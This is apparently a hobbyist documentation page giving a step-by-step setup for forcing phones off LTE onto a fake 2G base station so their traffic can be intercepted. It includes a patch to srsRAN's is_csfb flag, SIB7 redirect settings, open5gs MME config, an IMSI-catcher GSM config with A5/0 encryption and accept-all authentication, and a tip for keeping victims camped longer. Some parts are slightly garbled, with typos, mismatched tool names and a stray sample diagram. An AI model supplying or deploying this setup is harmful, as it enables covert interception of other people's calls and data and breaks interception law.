Binding down to unsafe network
==============================

Contents
--------

.. toctree::
   :maxdepth: 1

.. image:: https://ios-img.gamergen.com/pwned_01D4015300003952.png

PoC
---

First example :

.. raw:: html

   <iframe width="240" height="120" src="https://www.youtube.com/embed/PXLblq6JDss?si=ehTA8gRo9vsEjRqm" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>

   </iframe>

Second Example :

.. raw:: html

   <iframe width="240" height="120" src="https://www.youtube.com/embed/Zn2KkymDGe0?si=Y6cqUFY9XJ6nhCR5" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
  

The redirection part
====================

Binding down to unsafe network


Getting started
---------------

.. mermaid ::

    graph TD
    Phone i 4G  --> Fallback 2G
    Fallback 2G -- MitM --> Internet

.. mermaid::

sequenceDiagram
    Alice->>John: Hello John, how are you?
    John-->>Alice: Great!
    Alice-)John: See you later!

This is an explanation of how the UE is forced to fall
back to a GERAN (2G/EDGE) cell—specifically because we broadcast a fake
Tracking Area Code (TAC) that is one higher or one lower than the “real”
TAC, and because the ``is_csfb`` flag is set to true inside the
``send_connection_release()`` function. The snippet in question lives in
``rrc_ue.cc`` under ``void rrc::ue::send_connection_release()``;
it looks like this:

.. code:: cpp

   void rrc::ue::send_connection_release()
   {
     dl_dcch_msg_s dl_dcch_msg;
     auto&         rrc_release          = dl_dcch_msg.msg.set_c1().set_rrc_conn_release();
     rrc_release.rrc_transaction_id     = (uint8_t)((transaction_id++) % 4);
     rrc_conn_release_r8_ies_s& rel_ies = rrc_release.crit_exts.set_c1().set_rrc_conn_release_r8();
     rel_ies.release_cause              = release_cause_e::other;

     if (is_csfb) {
       if (parent->sib7.carrier_freqs_info_list.size() > 0) {
         rel_ies.redirected_carrier_info_present = true;
         rel_ies.redirected_carrier_info.set_geran();
         rel_ies.redirected_carrier_info.geran() = parent->sib7.carrier_freqs_info_list[0].carrier_freqs;
       } else {
         rel_ies.redirected_carrier_info_present = false;
       }
     }

     std::string octet_str;
     send_dl_dcch(&dl_dcch_msg, nullptr, &octet_str);
   }

```|

What this code does ?
---------------------  

Context:
Why ``send_connection_release()``
is called

1. **RRC command Release role**

    In a standard LTE eNodeB‐UE RRC procedure, the network can decide to tear down (release) an RRC connection by sending an RRC Connection Release message.

    In our “interception 2G” scenario, we first lure the UE onto a cell whose TAC is artificially set to something like “original TAC + 1” (or “original TAC – 1”). Because the UE sees a new TAC that doesn’t match its currently registered TAC, it performs a Tracking Area Update and establishes an RRC Connection on that fake cell.

    As soon as the UE is RRC‐connected to that fake cell (with TAC ±1), the eNodeB calls send_connection_release(). In other words, the UE is now camped on our fake LTE cell, and we want to immediately force it off LTE and onto GERAN.


2. **The crucial 'if (is_csfb)' block**

   -  The member variable ``is_csfb`` was set to ``true`` earlier (in
      ``rrc_ue.h``). Because of that, this ``if`` always succeeds. If it
      had been ``false``, the code inside would be skipped, and the RRC
      Release would carry **no redirection info**—the UE would simply go
      back to idle on LTE.

   -  Since ``is_csfb == true``, we check whether
``parent->sib7.carrier_freqs_info_list.size() > 0``
      In practice,
``sib7.carrier_freqs_info_list[0].carrier_freqs``
  -   It is a list of GERAN frequencies that we broadcast
      in the system information (SIB7) of our fake LTE cell. We typically 
      populate that list withone or more GSM/EDGE 
      ARFCNs (e.g., BCCH channels).


Why this makes the UE fall back to 2G for about one minute
----------------------------------------------------------

1. **Step 1: UE camps on fake LTE cell (TAC ± 1)**

   -  The UE was originally registered on a “real” LTE cell (TAC = X).
      We broadcast a second cell with TAC = X + 1 (or X – 1). Because
      the Tracking Area Code no longer matches, the UE performs a new
      RRC connection attachment to that fake cell. It’s now in LTE RRC
      Connected state on our interception cell.

2. **Step 2: RRC Connection Release + CSFB redirect**

   -  Immediately, the eNodeB runs ``send_connection_release()``.
      Because ``is_csfb == true``, the UE receives:

.. code::

         RRC Connection Release
           • release_cause = other
           • redirected_carrier_info_present = true
             – type = GERAN
             – list of GERAN frequencies (from SIB7)

   -  LTE RRC dictates that as soon as an RRC Connection Release with
      redirection is received, the UE must tear down its LTE RRC session
      **and** immediately perform a cell reselection to the given 2G
      ARFCN(s).

3. **Step 3: UE camps on GERAN (Interception 2G)**

   -  The UE tunes to the indicated BCCH frequency (e.g., an ARFCN in
      the GSM 900/1800 band). It performs a normal “GSM Attach” or
      “Location Update” on that cell. Because our IMSI‐catcher is
      pretending to be a legal GSM BTS, the UE finishes its location
      update and thinks it is “registered” on 2G.

4. **Step 4: UE gives up after ≈ 60 seconds**

   -  After roughly one minute of “stuck in 2G without any real
      service,” the UE automatically decides that this 2G cell is
      useless. Its firmware triggers a “cell reselection” back to the
      strongest LTE cell available (which, in our testbed, is still the
      legitimate operator’s LTE cell).
   -  At that point, the UE re‐attaches to LTE (or resumes its previous
      EPS context) and resumes normal data/VoLTE usage.


Summary
-------

-  We broadcast a second LTE cell whose Tracking Area Code (TAC) is set
   to “original_TAC ± 1.” Because the UE sees a mismatched TAC, it camps
   on our fake LTE cell in **RRC Connected** state.

-  In the ``send_connection_release()`` function of ``rrc_ue.cc``, we
   have forced ``is_csfb = true`` (in ``rrc_ue.h``). As soon as the UE
   attaches to our fake cell, the code builds an **RRC Connection
   Release** message containing:

   1. ``release_cause = other``
   2. ``redirected_carrier_info_present = true``
   3. A **GERAN** redirection IE listing one or more 2G/EDGE frequencies  
      (pulled from ``parent->sib7.carrier_freqs_info_list[0]``).

-  When the UE receives that RRC release with redirection, it
   immediately tears down LTE and camps onto the specified GSM/EDGE
   frequency.

-  In short, the combination of:

   1. broadcasting TAC ± 1 to trick the UE into RRC‐connecting to our
      cell,
   2. setting ``is_csfb = true`` so that **every** RRC Connection
      Release includes a GERAN redirect, allows us to force the UE into
      2G for roughly 60 seconds before it finally realizes “no real
      service here” and returns to LTE.

This is why, in an interception scenario, the UE ends up on the fake 2G
network for about one minute: it’s following the standard CSFB procedure
(driven by ``is_csfb = true`` in ``send_connection_release()``), but the
interceptor never completes a valid 2G attach/Authentication/MSC
handover.

.. danger::

   After its internal 2G timers time out (≈ 60 s), the UE reverts to LTE.

Keep the 2G channel
===================

Below is a step‐by‐step explanation of what happens when you redirect a
phone twice to the same ARFCN, first advertising a “real” operator
MCC/MNC (so the UE attaches normally), then advertising MCC = 001, MNC =
01 (PLMN 001–01). In particular, we’ll see why the UE stays camped on 2G
001–01 (even though that PLMN is “not allowed” by its SIM) and never
immediately falls back to 4G.

1. Scenario summary
-------------------

1. **First redirection**:

   -  You run your fake eNodeB on a given GSM ARFCN (e.g. BCCH = ARFCN
      871).
   -  In ``send_connection_release()``, you set ``is_csfb = true`` and
      include in the RRC Release that same ARFCN under a “real” operator
      PLMN (call it MCC/MNC = AAA–BBB).
   -  The UE receives “RRC Release + redirect to GSM ARFCN 871 under
      PLMN AAA–BBB,” tears down LTE and camps on that 2G cell in PLMN
      AAA–BBB. Because AAA–BBB is a valid Home (or equivalent) PLMN, the
      UE attaches successfully in 2G.

2. **Second redirection (same ARFCN, but now PLMN = 001–01)**:

   -  You leave the same GSM BCCH ARFCN 871 on air, but you change the
      cell’s MCC/MNC to 001–01. In other words, everything about that 2G
      cell (ARFCN, BSIC, SIB7 neighbor lists, etc.) is identical—only
      the PLMN now reads “001–01” instead of “AAA–BBB.”
   -  The UE, still camped on 2G AAA–BBB or coming from LTE, gets
      redirected again via LTE RRC Release → it tears down LTE and camps
      on 2G ARFCN 871 under MCC/MNC 001–01.
   -  Now the UE performs a normal 2G Location Update, and the fake 2G
      BTS (IMSI‐catcher) replies “LAU accept” cause it is set with accept all
      authentication

At this point, the UE is sitting on a 2G cell broadcasting PLMN
001–01—which is not in its allowed PLMN list—yet it does **not**
immediately go back to LTE. Why?


2. How the UE decides which PLMN to camp on in 2G
-------------------------------------------------

2.1 2G cell selection / reselection basics

When a UE is in Idle mode (RRC IDLE on LTE or Idle on 2G), it
continually looks for the “best” cell according to these priorities (per
3GPP TS 23.122 and TS 36.304):

2.2 Cell‐ranking inside a given PLMN

If multiple cells broadcast the same PLMN, the UE uses “cell
reselection” criteria (signal‐strength thresholds and ranking
parameters) to choose which one it likes best.
If a cell’s PLMN is on the SIM’s **Forbidden PLMN** (FPLMN) list,
The UE will normally treat that cell as “barred” and not camp on
it—unless it was forced by RRC redirection.

2.3 Forced RRC redirection overrides normal camp rules

When an LTE eNodeB sends **“RRC Connection Release with
edirected_carrier_info → GERAN, PLMN = 001–01, ARFCN = 871”**, the
UE immediately **aborts** whatever it was about to do in LTE (or 2G)
and tunes to GERAN ARFCN 871 under PLMN 001–01.

Even if PLMN 001–01 is not in the UE’s allowed list, the UE obeys the
RRC redirection first. In other words:

1. **RRC release** → UE is told “drop your LTE RRC and go camp on
   that 2G BCCH (ARFCN 871, MCC/MNC 001–01).”
2. UE tunes to 2G ARFCN 871, decodes SIBs, sees PLMN 001–01, and
   camps—even though that PLMN is “forbidden” by its SIM. Because RRC
   redirection has **higher priority**, the UE must at least attempt
   to attach.

3. Why the UE does *not* immediately fall back to 4G
----------------------------------------------------

-  A UE in idle on 2G waits for periodic “cell reselection” checks
   (every few hundred ms). It will consider these in order:

   1. “Is there a higher‐priority 2G or 3G cell whose PLMN is allowed?”
   2. “Is there a same‐priority 2G/3G cell I like better?”
   3. “Is there any 3G/4G (UTRAN/E-UTRAN) neighbor in the SIBs I can
      reselect to?”

-  Therefore, from the UE’s point of view:

.. tip::
   “I’m registered on ARFCN 871 (2G), PLMN 001–01,
   but I have no other candidate cell broadcasts in
   my BCCH. I must stay here until I find an alternative cell.”
   When I try to handover I announce PLMN 001-01 and all eNodeB
   rejected me.

4. Putting it all together
--------------------------

-  **First redirection (PLMN AAA–BBB)** → UE obeys RRC Release, camps on
   2G ARFCN 871/AAA–BBB, attaches normally because AAA–BBB is in its
   allowed list.

-  **Second redirection (PLMN 001–01)** → UE obeys RRC Release again,
   camps on 2G ARFCN 871/001–01, then sends LAU. Network replies “PLMN
   not allowed.” UE marks 001–01 as forbidden but remains physically on
   ARFCN 871 because:

   1. It was forced there by RRC, ignoring normal “don’t camp on
      forbidden” immediately.
   2. No other cell (including any real LTE) was advertised in that 2G
      BCCH’s neighbor lists.
   3. The UE’s cell‐reselection logic must find a strictly “better”
      allowed cell before vacating ARFCN 871—hence it stays there until
      such a cell appears.

.. tip:: Thus, you see the UE stay on 2G 001–01 for several seconds (or even minutes, until it finds a different allowed PLMN / RAT). It does **not** “refall back to 4G” immediately, because from the UE’s perspective there simply isn’t any other *advertised* cell to go
I am hurry
==========

.. note::
   Abstract : we will have to install open5gs-mmed (genuine), srsenb (patched), and osmocom in docker (comunity made) to do the job

To install ``open5gs-mmed``, follow these steps:

Installing open5gs-mmed
~~~~~~~~~~~~~~~~~~~~~~~

1. **Prerequisites:**

   -  Ensure your system meets the requirements for running ``open5gs``.
   -  Have ``git`` installed for cloning repositories and ``cmake`` for
      building.

2. **Clone open5gs repository:**

   .. code:: bash

      git clone https://github.com/open5gs/open5gs
      cd open5gs

3. **Build and install open5gs-mmed:**

   .. code:: bash

      meson build
      cd build
      ninja
      sudo ninja install

4. **Configure ``open5gs-mmed`` parameters:**

   -  Edit the configuration file ``mme.conf`` located at
      ``/usr/local/etc/freeDiameter/`` to set necessary parameters such
      as network configuration, security settings, and interfaces.
   -  Example configuration (partial excerpt):

.. code:: yaml

   mme:
     freeDiameter: /usr/local/etc/freeDiameter/mme.conf
     s1ap:
       server:
         - address: 127.0.0.2
     gtpc:
       server:
         - address: 127.0.0.2
       client:
         sgwc:
           - address: 127.0.0.3
         smf:
           - address: 127.0.0.4
     metrics:
       server:
         - address: 127.0.0.2
           port: 9090
     gummei:
       - plmn_id:
           mcc: 208
           mnc: 15
         mme_gid: 2
         mme_code: 1
     tai:
       - plmn_id:
           mcc: 208
           mnc: 15
         tac: 6602
     security:
       integrity_order : [ EIA2, EIA1, EIA0 ]
       ciphering_order : [ EEA0, EEA1, EEA2 ]
     network_name:
       full: Open5GS
       short: Next
     mme_name: open5gs-mme0

   ################################################################################
   # SGaAP Server
   ################################################################################
   #  o MSC/VLR
   sgsap:
     client:
       - address: msc.open5gs.org # SCTP server address configured on the MSC/VLR
         local_address: 172.16.80.10 # SCTP local IP addresses to be bound in the MME
         map:
           tai:
             plmn_id:
               mcc: 208
               mnc: 15
             tac: 6602
           lai:
             plmn_id:
               mcc: 001
               mnc: 01
             lac: 111

5. **Start open5gs-mmed:**

   -  After configuration, start the ``open5gs-mmed`` service.
   -  Ensure logging is configured as desired to
      ``/var/local/log/open5gs/mme.log``.

Install osmo-nipc
~~~~~~~~~~~~~~~~~

For ``osmo-nipc``, follow these steps:

1. **Clone osmo-nipc repository:**

   .. code:: bash

      git clone https://github.com/godfuzz3r/osmo-nidc
      cd osmo-nidc

2. **Start osmo-nipc using Docker Compose:**

   .. code:: bash

      sudo docker-compose up

3. **Configure osmo-nipc:**

   -  Edit ``osmo-nipc`` configuration as needed, typically found in
      ``configs/configs.yaml``.

   -  Example configuration (partial excerpt):

      .. code:: yaml

         network:
           mcc: "1"
           mnc: "1"
           short-name: Test
           long-name: Test
           encryption: a5 0
           use-asterisk: true

         radio:
           band: DCS1800
           arfcn: 871
           nominal-power: 20
           max-power-red: 20
           device-type: uhd
           tx-path: TX/RX
           rx-path: TX/RX
           clock-ref: internal

         egprs:
           routing-enabled: true
           apn-name: free
           type-support: v4
           ip-prefix: 172.16.137.0/24
           ip-ifconfig: 172.16.137.1/24
           dns0: 172.16.137.1
           dns1: 172.16.137.1

4. **Start the osmo-nipc service:**

   -  Ensure the configurations are correct and start the service
      accordingly.

Patching srsran
~~~~~~~~~~~~~~~

To patch ``srsran`` for your specific needs, use the provided patch file
(``csfb.patch``). Apply the patch as follows:

1. **Create the patch**

.. code:: patch
   --- a/srsenb/hdr/stack/rrc/rrc_ue.h 2025-06-03 00:45:21.832243675 +0200
   +++ b/srsenb/hdr/stack/rrc/rrc_ue.h 2025-06-03 00:45:51.091399988 +0200
   @@ -173,7 +173,7 @@
      unique_rnti_ptr<rrc_mobility> mobility_handler;
      unique_rnti_ptr<rrc_endc>     endc_handler;
    
   -  bool is_csfb = false;
   +  bool is_csfb = true;
    
    private:
      srsran::unique_timer activity_timer; // for basic DL/UL activity timeout

2. **Apply the patch**

   .. code:: bash

      patch -p1 < path/to/csfb.patch

3. **Verify changes in** ``rrc_ue.h``:

   -  Ensure ``is_csfb`` is correctly set to ``true`` as per the patch:

      .. code:: cpp

         bool is_csfb = true;

Using sib.conf
~~~~~~~~~~~~~~~

Ensure your ``sib7.conf`` is correctly configured with the necessary
parameters for broadcasting SIB7 information on ARFCN 871 for DCS1800
band, as per your network setup.

::

   sib1 =
   {
       mcc = 1;
       mnc = 1;
       intra_freq_reselection = "Allowed";
       q_rx_lev_min = -65;
       //p_max = 3;
       cell_barred = "notBarred"
       si_window_length = 20;
       sched_info =
       (
           {
               si_periodicity = 16;

               // comma-separated array of SIB-indexes (from 3 to 13), leave empty or commented to just scheduler sib2
               si_mapping_info = [ 3, 7 ];
           }
       );
       system_info_value_tag = 0;
   };




   ..................SAME AS ORIGINAL..................



   sib7 =
   {
       t_resel_geran = 1;
       carrier_freqs_info_list =
       (
           {
               cell_resel_prio = 7; //maybe 1 ??
               ncc_permitted = 255;
               q_rx_lev_min = 0;
               thresh_x_high = 2;
               thresh_x_low = 2;

               start_arfcn = 871;
               band_ind = "dcs1800";
               explicit_list_of_arfcns = (
                  871
               );
           }
       );
   };

--------------

By following these steps, you can effectively set up and configure
``open5gs-mmed``, ``osmo-nipc``, and patch ``srsran`` to align with your
specific network requirements and testing scenarios. Adjust
configurations as needed for your particular deployment environment and
operational goals.

At this point of the project you will stay some few long minutes 
exposing your smartphone frames a good idea to go further is to increase timer
T3245
